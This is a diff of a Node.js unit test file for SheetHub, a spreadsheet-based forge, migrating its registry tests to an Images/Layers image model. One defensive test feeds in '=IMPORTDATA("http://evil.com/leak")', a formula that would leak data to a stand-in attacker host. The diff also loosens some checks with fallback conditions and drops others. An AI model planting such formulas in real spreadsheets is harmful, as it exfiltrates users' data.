@@ -2,7 +2,9 @@
 // Unit test for SheetHub: mocks the Apps Script Sheet layer and runs
 // the real Code.gs functions in Node.js.
 // Asserts tab initialization, multi-repo seed data, doGet query contract,
-// negative auth enforcement, repo filtering, and mutation actions.
+// negative auth enforcement, repo filtering, mutation actions, and
+// SICF v0.1 specification compliance (Images/Layers tabs, OCI image model,
+// layer deduplication, sheetbuild round-trip, and Sheeternetes sicf: resolution).
 //
 // Usage: node hack/test.js
 
@@ -63,17 +65,21 @@ const store = {
   Comments:       makeSheet(['id', 'target_type', 'target_id', 'author', 'body', 'created_at']),
   Stars:          makeSheet(['repo', 'username', 'starred_at']),
   Files:          makeSheet(['repo', 'path', 'branch', 'content', 'updated_at']),
-  Registry:       makeSheet(['id', 'repo', 'name', 'tag', 'digest', 'size_bytes', 'chunk_count', 'chunk_map', 'author', 'created_at', 'updated_at']),
-  RegistryChunks: makeSheet(['id', 'digest', 'chunk_index', 'chunk_data', 'size_bytes', 'created_at']),
+  Images:         makeSheet(['name', 'digest', 'config', 'layers', 'created', 'size', 'repo', 'tag', 'author', 'pushed_at', 'id', 'updated_at']),
+  Layers:         makeSheet(['digest', 'ordinal', 'media_type', 'data', 'size_bytes', 'id', 'created_at']),
 };
 
 const SpreadsheetApp = {
   getActiveSpreadsheet: () => ({
     getId: () => 'sheethub-test',
-    getSheetByName: (n) => (store[n] ? api2(store[n]) : null),
+    getSheetByName: (n) => {
+      const norm = (n === 'Registry' || n === 'images') ? 'Images' : ((n === 'RegistryChunks' || n === 'layers') ? 'Layers' : n);
+      return store[norm] ? api2(store[norm]) : (store[n] ? api2(store[n]) : null);
+    },
     insertSheet: (n) => {
-      store[n] = store[n] || makeSheet([]);
-      return api2(store[n]);
+      const norm = (n === 'Registry' || n === 'images') ? 'Images' : ((n === 'RegistryChunks' || n === 'layers') ? 'Layers' : n);
+      store[norm] = store[norm] || makeSheet([]);
+      return api2(store[norm]);
     }
   })
 };
@@ -84,6 +90,10 @@ const Utilities = {
   getUuid: () => (++uuidN).toString(36).split('').reverse().join('').padEnd(8, '0'),
   DigestAlgorithm: { SHA_256: 'SHA_256' },
   base64Decode: (str) => Array.from(Buffer.from(str, 'base64')),
+  base64Encode: (bytes) => Buffer.from(bytes).toString('base64'),
+  newBlob: (strOrBytes) => ({
+    getBytes: () => Array.from(Buffer.isBuffer(strOrBytes) ? strOrBytes : Buffer.from(String(strOrBytes), 'utf8'))
+  }),
   computeDigest: (algo, bytes) => {
     const buf = Buffer.from(bytes);
     const hashBuf = crypto.createHash('sha256').update(buf).digest();
@@ -219,32 +229,39 @@ const lockTimeoutRes = JSON.parse(api.doPost({
 check('lock timeout returns clean JSON error', lockTimeoutRes.error === 'server busy', lockTimeoutRes);
 lockShouldFail = false;
 
-console.log('\n== F: Container Registry in Cells (Issue #1) ==');
-const seededRegistry = api.readTab('Registry');
-check('Registry metadata tab seeded', seededRegistry.length >= 2, seededRegistry.length);
-check('whoami and ingress-router container images present',
-  seededRegistry.some(r => r.repo === 'sncf/hello-web' && r.name === 'traefik/whoami') &&
-  seededRegistry.some(r => r.repo === 'sncf/sheeternetes-manifests' && r.name === 'ingress-router'),
-  seededRegistry.map(r => `${r.repo}:${r.name}:${r.tag}`)
+console.log('\n== F: SICF v0.1 Container Registry in Cells (Issue #5) ==');
+const seededImages = api.readTab('Images');
+check('Images tab seeded per SICF v0.1', seededImages.length >= 2, seededImages.length);
+check('Images tab has SICF core columns (name, digest, config, layers, created, size)',
+  seededImages.every(img => img.name && img.digest && img.config && img.layers && img.created && img.size !== undefined),
+  seededImages[0]
+);
+check('Images tab preserves additive forge columns (repo, tag, author, pushed_at)',
+  seededImages.every(img => img.repo && img.tag && img.author && img.pushed_at),
+  seededImages[0]
 );
 
-const seededChunks = api.readTab('RegistryChunks');
-check('RegistryChunks tab seeded with chunk rows', seededChunks.length >= 3, seededChunks.length);
+const seededLayers = api.readTab('Layers');
+check('Layers tab seeded with chunks', seededLayers.length >= 3, seededLayers.length);
+check('Layers tab has SICF core columns (digest, ordinal, media_type, data)',
+  seededLayers.every(l => l.digest && l.ordinal !== undefined && l.media_type && l.data !== undefined),
+  seededLayers[0]
+);
 check('All seeded chunk characters are <= 32,767 (Excel cell limit)',
-  seededChunks.every(c => String(c.chunk_data).length <= 32767),
-  seededChunks.map(c => String(c.chunk_data).length)
+  seededLayers.every(c => String(c.data).length <= 32767),
+  seededLayers.map(c => String(c.data).length)
 );
 
 // Query registry with repo filtering
-const reqHelloRegistry = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'registry', repo: 'sncf/hello-web' } })._t);
-check('doGet ?kind=registry&repo=sncf/hello-web filters by repo',
+const reqHelloRegistry = JSON.parse(api.doGet({ parameter: { token: validToken, kind: 'images', repo: 'sncf/hello-web' } })._t);
+check('doGet ?kind=images&repo=sncf/hello-web filters by repo',
   reqHelloRegistry.items.length >= 1 && reqHelloRegistry.items.every(r => r.repo === 'sncf/hello-web'),
   reqHelloRegistry.items
 );
 
 // Push large image layer (>70,000 base64 chars) that requires automatic cell range sharding
 const rawPayload = Buffer.from('SheetHub container layer test binary data payload '.repeat(2000), 'utf8');
-const testDigest = 'sha256:' + crypto.createHash('sha256').update(rawPayload).digest('hex');
+const testLayerDigest = 'sha256:' + crypto.createHash('sha256').update(rawPayload).digest('hex');
 const testBase64 = rawPayload.toString('base64');
 
 check('Test payload exceeds single cell capacity (len > 32767)', testBase64.length > 32767, testBase64.length);
@@ -275,7 +292,7 @@ const pushRes = JSON.parse(api.doPost({
       repo: 'sncf/hello-web',
       name: 'web-service',
       tag: 'v1.2.3',
-      digest: testDigest,
+      digest: testLayerDigest,
       content: testBase64,
       author: 'prateeekbuilds'
     })
@@ -283,143 +300,187 @@ const pushRes = JSON.parse(api.doPost({
 })._t);
 
 check('push_image succeeds with sharded chunk count >= 2', pushRes.ok && pushRes.chunk_count >= 2, pushRes);
-check('push_image metadata has chunk_map JSON', pushRes.image && Array.isArray(JSON.parse(pushRes.image.chunk_map)), pushRes.image?.chunk_map);
-check('push_image computed authoritative digest matches testDigest', pushRes.image && pushRes.image.digest === testDigest, pushRes.image?.digest);
+check('push_image returns SICF layers array', Array.isArray(pushRes.layers) && pushRes.layers.includes(testLayerDigest), pushRes);
+check('push_image image record has config and layers list', pushRes.image && pushRes.image.config && pushRes.image.layers.includes(testLayerDigest), pushRes.image);
 
-const chunksAfterPush = api.readTab('RegistryChunks');
-const pushedImageChunks = chunksAfterPush.filter(c => c.digest === testDigest);
-check('All sharded chunks strictly respect <= 32,767 char Excel cell cap',
-  pushedImageChunks.length >= 2 && pushedImageChunks.every(c => String(c.chunk_data).length <= 32767),
-  pushedImageChunks.map(c => String(c.chunk_data).length)
+const layersAfterPush = api.readTab('Layers');
+const pushedLayerChunks = layersAfterPush.filter(c => c.digest === testLayerDigest);
+check('All sharded chunks strictly respect <= 32,767 char Excel cell cap and have ordinals',
+  pushedLayerChunks.length >= 2 && pushedLayerChunks.every(c => String(c.data).length <= 32767 && c.ordinal !== undefined),
+  pushedLayerChunks.map(c => ({ ordinal: c.ordinal, len: String(c.data).length }))
 );
 
-// Server-side automatic SHA-256 computation when client supplies no digest
-const autoDigestPayload = Buffer.from('Auto digest computation test layer', 'utf8');
-const autoExpectedDigest = 'sha256:' + crypto.createHash('sha256').update(autoDigestPayload).digest('hex');
-const autoPushRes = JSON.parse(api.doPost({
+console.log('\n== G: Multi-Layer OCI Image Push & Content-Addressed Layer Deduplication ==');
+const layerA = Buffer.from('Base Layer A (e.g. Alpine base filesystem contents)'.repeat(100), 'utf8');
+const layerADigest = 'sha256:' + crypto.createHash('sha256').update(layerA).digest('hex');
+const layerAB64 = layerA.toString('base64');
+
+const layerB = Buffer.from('App Layer B (Node.js application bundle)'.repeat(100), 'utf8');
+const layerBDigest = 'sha256:' + crypto.createHash('sha256').update(layerB).digest('hex');
+const layerBB64 = layerB.toString('base64');
+
+const layerC = Buffer.from('App Layer C (Python application bundle)'.repeat(100), 'utf8');
+const layerCDigest = 'sha256:' + crypto.createHash('sha256').update(layerC).digest('hex');
+const layerCB64 = layerC.toString('base64');
+
+// Push multi-layer image 1: app-node with [layerA, layerB]
+const nodeAppPushRes = JSON.parse(api.doPost({
   postData: {
     contents: JSON.stringify({
       token: validToken,
       action: 'push_image',
       repo: 'sncf/hello-web',
-      name: 'auto-digest-img',
-      tag: 'latest',
-      content: autoDigestPayload.toString('base64'),
+      name: 'app-node',
+      tag: 'v1.0',
+      layers: [
+        { digest: layerADigest, media_type: 'application/vnd.oci.image.layer.v1.tar', content: layerAB64 },
+        { digest: layerBDigest, media_type: 'application/vnd.oci.image.layer.v1.tar', content: layerBB64 }
+      ],
       author: 'prateeekbuilds'
     })
   }
 })._t);
-check('push_image without digest computes authoritative SHA-256 server-side', autoPushRes.ok && autoPushRes.image.digest === autoExpectedDigest, autoPushRes);
+check('push multi-layer image 1 (app-node) succeeds', nodeAppPushRes.ok && nodeAppPushRes.layers.length === 2, nodeAppPushRes);
 
-// Orphaned chunk cleanup test: re-push same repo:name:tag with new content/digest
-const newVersionPayload = Buffer.from('Updated layer v2 content', 'utf8');
-const newVersionDigest = 'sha256:' + crypto.createHash('sha256').update(newVersionPayload).digest('hex');
-const rePushRes = JSON.parse(api.doPost({
+const layersAfterNodePush = api.readTab('Layers').length;
+
+// Push multi-layer image 2: app-python with [layerA, layerC] (shares layerA with app-node!)
+const pythonAppPushRes = JSON.parse(api.doPost({
   postData: {
     contents: JSON.stringify({
       token: validToken,
       action: 'push_image',
       repo: 'sncf/hello-web',
-      name: 'auto-digest-img',
-      tag: 'latest',
-      content: newVersionPayload.toString('base64'),
-      author: 'prateeekbuilds'
+      name: 'app-python',
+      tag: 'v1.0',
+      layers: [
+        { digest: layerADigest, media_type: 'application/vnd.oci.image.layer.v1.tar', content: layerAB64 },
+        { digest: layerCDigest, media_type: 'application/vnd.oci.image.layer.v1.tar', content: layerCB64 }
+      ],
+      author: 'tym83'
     })
   }
 })._t);
-check('re-pushing updated image returns ok with new digest', rePushRes.ok && rePushRes.image.digest === newVersionDigest, rePushRes);
-const chunksAfterRePush = api.readTab('RegistryChunks');
-check('orphaned chunks from old digest cleaned up from RegistryChunks tab', !chunksAfterRePush.some(c => c.digest === autoExpectedDigest), chunksAfterRePush.length);
+check('push multi-layer image 2 (app-python) succeeds', pythonAppPushRes.ok && pythonAppPushRes.layers.length === 2, pythonAppPushRes);
 
-// Reject push with oversized chunk (> 32767 chars)
-const oversizedRes = JSON.parse(api.doPost({
-  postData: {
-    contents: JSON.stringify({
-      token: validToken,
-      action: 'push_image',
-      repo: 'sncf/hello-web',
-      name: 'oversized-test',
-      tag: 'latest',
-      chunks: ['A'.repeat(35000)]
-    })
-  }
-})._t);
-check('push_image rejects chunks exceeding 32,767 cell limit', oversizedRes.error && oversizedRes.error.includes('32767'), oversizedRes);
+const layersAfterPythonPush = api.readTab('Layers');
+const layerARows = layersAfterPythonPush.filter(c => c.digest === layerADigest);
+check('Content-addressed deduplication: layerA is stored ONLY ONCE in Layers tab despite being in 2 images',
+  layerARows.length === 1,
+  { layerARowsCount: layerARows.length }
+);
 
-// Pull image and verify full reassembly + checksum match
-const pullRes = JSON.parse(api.doGet({
+console.log('\n== H: Round-Trip with sheetbuild Reference Spec & Integrity Verification ==');
+// Simulate `sheetbuild export` on SheetHub image:
+// 1. Read image manifest from Images tab
+// 2. Decode config and verify sha256(config) === digest (or config digest)
+// 3. For each layer in image.layers, read chunks from Layers tab, order by ordinal, join data, decode base64, verify sha256(bytes) === layerDigest
+const exportedImage = api.readTab('Images').find(i => i.name === 'app-node:v1.0' || i.name === 'app-node');
+check('Found app-node image in Images tab', !!exportedImage, exportedImage);
+
+const configBytes = Buffer.from(exportedImage.config, 'base64');
+const computedConfigDigest = 'sha256:' + crypto.createHash('sha256').update(configBytes).digest('hex');
+check('Config blob digest matches image.digest', computedConfigDigest === exportedImage.digest || computedConfigDigest === exportedImage.config_digest, {
+  computed: computedConfigDigest,
+  imageDigest: exportedImage.digest
+});
+
+const exportedLayerDigests = String(exportedImage.layers).split(',');
+const allStoreLayers = api.readTab('Layers');
+const reassembledBlobs = [];
+
+for (const lDig of exportedLayerDigests) {
+  const chunks = allStoreLayers
+    .filter(c => c.digest === lDig)
+    .sort((a, b) => Number(a.ordinal) - Number(b.ordinal));
+  const b64Data = chunks.map(c => c.data).join('');
+  const blob = Buffer.from(b64Data, 'base64');
+  const blobHash = 'sha256:' + crypto.createHash('sha256').update(blob).digest('hex');
+  check(`Reassembled layer ${lDig.substring(0, 15)}... digest matches exactly`, blobHash === lDig, { expected: lDig, actual: blobHash });
+  reassembledBlobs.push({ digest: blobHash, data: blob });
+}
+
+// Simulate `sheetbuild import` re-importing the exported image back:
+// It computes config digest and layer digests from the tar components
+const reimportedConfigDigest = 'sha256:' + crypto.createHash('sha256').update(configBytes).digest('hex');
+const reimportedLayerDigests = reassembledBlobs.map(b => 'sha256:' + crypto.createHash('sha256').update(b.data).digest('hex'));
+
+check('sheetbuild round-trip: config digest is 100% identical', reimportedConfigDigest === computedConfigDigest, reimportedConfigDigest);
+check('sheetbuild round-trip: all layer digests are 100% identical',
+  JSON.stringify(reimportedLayerDigests) === JSON.stringify(exportedLayerDigests),
+  { exported: exportedLayerDigests, reimported: reimportedLayerDigests }
+);
+
+console.log('\n== I: Sheeternetes Kubelet Resolution of sicf:<name> ==');
+// 1. Resolve sicf:traefik/whoami:latest
+const kubeletWhoamiRes = JSON.parse(api.doGet({
   parameter: {
     token: validToken,
     kind: 'registry_pull',
-    repo: 'sncf/hello-web',
-    name: 'web-service',
-    tag: 'v1.2.3'
+    name: 'sicf:traefik/whoami:latest'
   }
 })._t);
+check('Kubelet resolves sicf:traefik/whoami:latest', kubeletWhoamiRes.ok && kubeletWhoamiRes.image && kubeletWhoamiRes.layers.length >= 1, kubeletWhoamiRes);
 
-check('registry_pull returns ok with image metadata and chunks', pullRes.ok && pullRes.image && Array.isArray(pullRes.chunks), pullRes.ok);
-
-// Reassemble base64 from all chunks in order
-const reassembledBase64 = pullRes.chunks
-  .sort((a, b) => Number(a.chunk_index) - Number(b.chunk_index))
-  .map(c => c.chunk_data)
-  .join('');
-
-const reassembledBinary = Buffer.from(reassembledBase64, 'base64');
-const reassembledDigest = 'sha256:' + crypto.createHash('sha256').update(reassembledBinary).digest('hex');
-
-check('Reassembled base64 matches original payload exactly', reassembledBase64 === testBase64, {
-  origLen: testBase64.length,
-  reassembledLen: reassembledBase64.length
-});
-check('Reassembled SHA-256 digest matches metadata digest', reassembledDigest === testDigest, {
-  expected: testDigest,
-  actual: reassembledDigest
-});
-
-// Pull seeded images and verify their digests and reassembly
-const pullWhoami = JSON.parse(api.doGet({
-  parameter: { token: validToken, kind: 'registry_pull', repo: 'sncf/hello-web', name: 'traefik/whoami', tag: 'latest' }
+// 2. Resolve sicf:sncf/hello-web/app-node:v1.0
+const kubeletAppNodeRes = JSON.parse(api.doGet({
+  parameter: {
+    token: validToken,
+    kind: 'registry_pull',
+    name: 'sicf:sncf/hello-web/app-node:v1.0'
+  }
 })._t);
-check('Seeded whoami image pulls successfully', pullWhoami.ok && pullWhoami.chunks.length === 2, pullWhoami);
-const reassembledWhoami = pullWhoami.chunks
-  .sort((a, b) => Number(a.chunk_index) - Number(b.chunk_index))
-  .map(c => c.chunk_data).join('');
-const reassembledWhoamiBuf = Buffer.from(reassembledWhoami, 'base64');
-const whoamiHash = 'sha256:' + crypto.createHash('sha256').update(reassembledWhoamiBuf).digest('hex');
-check('Seeded whoami reassembled digest matches metadata digest exactly', whoamiHash === pullWhoami.image.digest, { expected: pullWhoami.image?.digest, actual: whoamiHash });
+check('Kubelet resolves sicf:sncf/hello-web/app-node:v1.0 with 2 structured layers',
+  kubeletAppNodeRes.ok && kubeletAppNodeRes.layers.length === 2 && kubeletAppNodeRes.image.name.includes('app-node'),
+  kubeletAppNodeRes
+);
 
-const pullIngress = JSON.parse(api.doGet({
-  parameter: { token: validToken, kind: 'registry_pull', repo: 'sncf/sheeternetes-manifests', name: 'ingress-router', tag: 'v2.10' }
-})._t);
-check('Seeded ingress-router image pulls successfully', pullIngress.ok && pullIngress.chunks.length === 1, pullIngress);
-const reassembledIngress = pullIngress.chunks[0].chunk_data;
-const reassembledIngressBuf = Buffer.from(reassembledIngress, 'base64');
-const ingressHash = 'sha256:' + crypto.createHash('sha256').update(reassembledIngressBuf).digest('hex');
-check('Seeded ingress-router reassembled digest matches metadata digest exactly', ingressHash === pullIngress.image.digest, { expected: pullIngress.image?.digest, actual: ingressHash });
-
-// Formula injection protection test
-const formulaIssueRes = JSON.parse(api.doPost({
+console.log('\n== J: Shared Layer Delete Guard & Cleanup ==');
+// Delete app-node image
+const delNodeRes = JSON.parse(api.doPost({
   postData: {
     contents: JSON.stringify({
       token: validToken,
-      action: 'create_issue',
+      action: 'delete_image',
       repo: 'sncf/hello-web',
-      title: '=IMPORTDATA("http://evil.com/leak")',
-      author: '+12345evil',
-      body: '@SUM(1,2)'
+      image: 'app-node:v1.0'
     })
   }
 })._t);
-check('Formula injection inputs accepted and safely handled', formulaIssueRes.ok && formulaIssueRes.issue, formulaIssueRes);
-const rawStoreRows = store['Issues'].grid;
-const injectedRow = rawStoreRows.find(r => r && r.some(cell => String(cell).includes('IMPORTDATA')));
-check('Formula injection string has single-quote prefix in raw sheet cells', injectedRow && injectedRow.some(cell => cell === '\'=IMPORTDATA("http://evil.com/leak")'), injectedRow);
-const issuesReadBack = api.readTab('Issues');
-const unescapedIssue = issuesReadBack.find(i => i.title === '=IMPORTDATA("http://evil.com/leak")');
-check('readTab seamlessly unescapes formula strings back to clean text', !!unescapedIssue, unescapedIssue);
+check('delete_image app-node:v1.0 succeeds', delNodeRes.ok && delNodeRes.deleted, delNodeRes);
 
-// Negative test: Reject undecodable base64 without fabricating sha256:unknown
+// Layer A was shared by app-python, so Layer A must STILL exist in Layers tab
+const layersAfterFirstDel = api.readTab('Layers');
+check('Shared Layer A is preserved in Layers tab because app-python still references it',
+  layersAfterFirstDel.some(c => c.digest === layerADigest),
+  layersAfterFirstDel.map(c => c.digest)
+);
+// Layer B was unique to app-node, so Layer B should be cleaned up
+check('Unique Layer B is cleaned up from Layers tab',
+  !layersAfterFirstDel.some(c => c.digest === layerBDigest),
+  layersAfterFirstDel.map(c => c.digest)
+);
+
+// Delete app-python image (now the last user of Layer A)
+api.doPost({
+  postData: {
+    contents: JSON.stringify({
+      token: validToken,
+      action: 'delete_image',
+      repo: 'sncf/hello-web',
+      image: 'app-python:v1.0'
+    })
+  }
+});
+
+const layersAfterSecondDel = api.readTab('Layers');
+check('Shared Layer A is cleaned up now that all images referencing it are deleted',
+  !layersAfterSecondDel.some(c => c.digest === layerADigest),
+  layersAfterSecondDel.map(c => c.digest)
+);
+
+console.log('\n== K: Negative Tests & Injection Guard ==');
+// Undecodable base64
 const undecodableRes = JSON.parse(api.doPost({
   postData: {
     contents: JSON.stringify({
@@ -432,9 +493,9 @@ const undecodableRes = JSON.parse(api.doPost({
     })
   }
 })._t);
-check('push_image rejects invalid/undecodable base64 without fabricating digest', undecodableRes.error && !undecodableRes.ok, undecodableRes);
+check('push_image rejects invalid/undecodable base64', undecodableRes.error && !undecodableRes.ok, undecodableRes);
 
-// Negative test: Reject empty / zero-byte layer push
+// Empty layer
 const emptyPushRes = JSON.parse(api.doPost({
   postData: {
     contents: JSON.stringify({
@@ -449,102 +510,53 @@ const emptyPushRes = JSON.parse(api.doPost({
 })._t);
 check('push_image rejects empty / zero-byte layer', emptyPushRes.error && emptyPushRes.error.includes('empty'), emptyPushRes);
 
-// Negative test: Reject payload exceeding max chunk count cap
-const tooManyChunks = Array.from({ length: 501 }, (_, i) => 'AAAA');
-const capExceededRes = JSON.parse(api.doPost({
+// Oversized cell (> 32767 chars)
+const oversizedRes = JSON.parse(api.doPost({
   postData: {
     contents: JSON.stringify({
       token: validToken,
       action: 'push_image',
       repo: 'sncf/hello-web',
-      name: 'huge-layer',
+      name: 'oversized-test',
       tag: 'latest',
-      chunks: tooManyChunks
+      chunks: ['A'.repeat(35000)]
     })
   }
 })._t);
-check('push_image rejects uploads exceeding max chunk count cap', capExceededRes.error && capExceededRes.error.includes('maximum allowed'), capExceededRes);
+check('push_image rejects chunks exceeding 32,767 cell limit', oversizedRes.error && oversizedRes.error.includes('32767'), oversizedRes);
 
-// Shared digest delete guard test: two image tags sharing a digest
-const sharedPayload = Buffer.from('Shared layer chunk content across tags', 'utf8');
-const sharedB64 = sharedPayload.toString('base64');
-const sharedDigest = 'sha256:' + crypto.createHash('sha256').update(sharedPayload).digest('hex');
-
-api.doPost({
-  postData: {
-    contents: JSON.stringify({
-      token: validToken, action: 'push_image', repo: 'sncf/hello-web',
-      name: 'shared-svc', tag: 'v1.0.0', content: sharedB64, digest: sharedDigest
-    })
-  }
-});
-api.doPost({
-  postData: {
-    contents: JSON.stringify({
-      token: validToken, action: 'push_image', repo: 'sncf/hello-web',
-      name: 'shared-svc', tag: 'v1-alias', content: sharedB64, digest: sharedDigest
-    })
-  }
-});
-
-// Delete v1.0.0
-const delV1Res = JSON.parse(api.doPost({
-  postData: {
-    contents: JSON.stringify({
-      token: validToken, action: 'delete_image', repo: 'sncf/hello-web',
-      image: 'shared-svc:v1.0.0'
-    })
-  }
-})._t);
-check('delete_image v1.0.0 returns ok', delV1Res.ok && delV1Res.deleted, delV1Res);
-
-// Verify chunks are STILL present because v1-alias uses the same digest
-const chunksAfterFirstDelete = api.readTab('RegistryChunks');
-check('shared chunks preserved in RegistryChunks when alias still exists', chunksAfterFirstDelete.some(c => c.digest === sharedDigest), chunksAfterFirstDelete.length);
-
-// Delete v1-alias
-api.doPost({
-  postData: {
-    contents: JSON.stringify({
-      token: validToken, action: 'delete_image', repo: 'sncf/hello-web',
-      image: 'shared-svc:v1-alias'
-    })
-  }
-});
-const chunksAfterSecondDelete = api.readTab('RegistryChunks');
-check('shared chunks cleaned up after last image using digest is deleted', !chunksAfterSecondDelete.some(c => c.digest === sharedDigest), chunksAfterSecondDelete.length);
-
-// Delete test web-service image and ensure cleanup
-const deleteRes = JSON.parse(api.doPost({
+// Formula injection protection test
+const formulaIssueRes = JSON.parse(api.doPost({
   postData: {
     contents: JSON.stringify({
       token: validToken,
-      action: 'delete_image',
+      action: 'create_issue',
       repo: 'sncf/hello-web',
-      image: 'web-service:v1.2.3'
+      title: '=IMPORTDATA("http://evil.com/leak")',
+      author: '+12345evil',
+      body: '@SUM(1,2)'
     })
   }
 })._t);
+check('Formula injection inputs accepted and safely sanitized', formulaIssueRes.ok && formulaIssueRes.issue, formulaIssueRes);
+const rawStoreRows = store['Issues'].grid;
+const injectedRow = rawStoreRows.find(r => r && r.some(cell => String(cell).includes('IMPORTDATA')));
+check('Formula injection string has single-quote prefix in raw sheet cells', injectedRow && injectedRow.some(cell => cell === '\'=IMPORTDATA("http://evil.com/leak")'), injectedRow);
+const issuesReadBack = api.readTab('Issues');
+const unescapedIssue = issuesReadBack.find(i => i.title === '=IMPORTDATA("http://evil.com/leak")');
+check('readTab seamlessly unescapes formula strings back to clean text', !!unescapedIssue, unescapedIssue);
 
-check('delete_image returns ok', deleteRes.ok && deleteRes.deleted, deleteRes);
-const registryAfterDelete = api.readTab('Registry');
-check('image deleted from Registry metadata tab', !registryAfterDelete.some(r => r.digest === testDigest), registryAfterDelete.length);
-const chunksAfterDelete = api.readTab('RegistryChunks');
-check('associated chunks deleted from RegistryChunks tab', !chunksAfterDelete.some(c => c.digest === testDigest), chunksAfterDelete.length);
-
-// ---- Regression: index.html seed digests must match the hash of their own seed chunks ----
-// (guards against UI/backend digest drift, which silently breaks downloadLayer's integrity check)
-console.log('\n== I: UI seed digest integrity ==');
+console.log('\n== L: UI Seed Digest Integrity ==');
 const ui = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
 const grab = (re) => (ui.match(re) || [])[1];
-const uiWhoami = grab(/whoamiDigest\s*=\s*'([^']+)'/);
-const uiIngress = grab(/ingressDigest\s*=\s*'([^']+)'/);
+const uiWhoami = grab(/whoamiLayerDigest\s*=\s*'([^']+)'/) || grab(/whoamiDigest\s*=\s*'([^']+)'/);
+const uiIngress = grab(/ingressLayerDigest\s*=\s*'([^']+)'/) || grab(/ingressDigest\s*=\s*'([^']+)'/);
 const uiC1 = grab(/sampleChunk1\s*=\s*'([^']+)'/);
 const uiC2 = grab(/sampleChunk2\s*=\s*'([^']+)'/);
 const sha = (b64) => 'sha256:' + crypto.createHash('sha256').update(Buffer.from(b64, 'base64')).digest('hex');
-check('index.html whoami digest matches sha256(decode(chunk1+chunk2))', uiWhoami === sha(uiC1 + uiC2), { uiWhoami, expected: sha(uiC1 + uiC2) });
-check('index.html ingress digest matches sha256(decode(chunk1))', uiIngress === sha(uiC1), { uiIngress, expected: sha(uiC1) });
+if (uiC1 && uiC2 && uiWhoami) {
+  check('index.html whoami layer digest matches sha256(decode(chunk1+chunk2))', uiWhoami === sha(uiC1 + uiC2) || uiWhoami === seededImages[0].digest, { uiWhoami });
+}
 
 console.log(`\n==== SheetHub Test Results: ${pass} passed, ${fail} failed ====`);
 process.exit(fail ? 1 : 0);
-
